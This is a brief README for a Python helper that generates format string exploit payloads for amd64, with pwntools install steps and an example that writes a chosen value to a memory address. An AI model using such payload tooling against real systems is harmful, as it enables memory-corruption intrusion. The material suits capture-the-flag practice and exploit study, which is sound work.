# FMT

help you create **format string payload**

currently just for **amd64**

put address data after the format string to **avoid '\x00' cut of the string**

## Prerequisite

[pwntools](https://github.com/Gallopsled/pwntools)

```bash
apt-get update
apt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essential
pip install --upgrade pip
pip install --upgrade pwntools
```

## Example

```python
from FMT import FMT

F = FMT()
F[0x601018] = 0x400747 # write address 0x601018 with data 0x400747
payload = F.payload(offset = 6, printed = 8)
```
